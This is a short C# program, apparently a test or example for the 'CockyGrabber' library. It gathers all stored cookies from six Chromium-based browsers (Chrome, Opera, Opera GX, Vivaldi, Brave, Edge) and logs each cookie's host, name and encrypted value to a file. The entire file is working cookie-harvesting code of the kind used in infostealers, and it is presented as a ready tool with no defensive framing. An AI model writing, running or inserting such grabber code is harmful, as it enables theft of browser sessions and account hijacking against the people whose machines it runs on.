using CockyGrabber;
using CockyGrabber.Grabbers;
using System;
using System.Collections.Generic;
using System.IO;

namespace CockyGrabberTest
{
    // This Program collects all Cookies (from Chromium-based Browsers) and saves them in a text file
    class Program
    {
        static string LogFilePath = ""; // ENTER LOG FILE PATH

        #region Grabbers
        private static ChromeGrabber CG = new ChromeGrabber();
        private static OperaGrabber OG = new OperaGrabber();
        private static OperaGxGrabber OGG = new OperaGxGrabber();
        private static VivaldiGrabber VG = new VivaldiGrabber();
        private static BraveGrabber BG = new BraveGrabber();
        private static EdgeGrabber EG = new EdgeGrabber();
        #endregion

        static IEnumerable<Chromium.Cookie> GetAllCookies()
        {
            List<Chromium.Cookie> cookies = new List<Chromium.Cookie>();
            if (CG.CookiesExist())
            {
                cookies.AddRange(CG.GetCookies());
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("CHROME COOKIES FOUND!");
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("CHROME COOKIES NOT FOUND!");
            }

            if (OG.CookiesExist())
            {
                cookies.AddRange(OG.GetCookies());
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("OPERA COOKIES FOUND!");
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("OPERA COOKIES NOT FOUND!");
            }

            if (OGG.CookiesExist())
            {
                cookies.AddRange(OGG.GetCookies());
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("OPERA GX COOKIES FOUND!");
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("OPERA GX COOKIES NOT FOUND!");
            }

            if (VG.CookiesExist())
            {
                cookies.AddRange(VG.GetCookies());
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("VIVALDI COOKIES FOUND!");
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("VIVALDI COOKIES NOT FOUND!");
            }

            if (BG.CookiesExist())
            {
                cookies.AddRange(BG.GetCookies());
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("BRAVE COOKIES FOUND!");
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("BRAVE COOKIES NOT FOUND!");
            }

            if (EG.CookiesExist())
            {
                cookies.AddRange(EG.GetCookies());
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("EDGE COOKIES FOUND!");
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("EDGE COOKIES NOT FOUND!");
            }

            return cookies;
        }

        static void Main(string[] args)
        {
            if (LogFilePath == string.Empty)
            {
                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.Write("LogFilePath > ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                LogFilePath = Console.ReadLine();
            }

            List<string> cLines = new List<string>() {
                $"==========================================================================================",
                $"NEW LOG STARTED AT {DateTimeOffset.Now}:" };

            foreach (Chromium.Cookie c in GetAllCookies())
            {
                cLines.Add($"Host:{c.HostKey}; Name:{c.Name}; Value:{c.EncryptedValue}");
            }

            File.AppendAllLines(LogFilePath, cLines);

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("LOGGED ALL COOKIES!");

            System.Threading.Thread.Sleep(-1);
        }
    }
}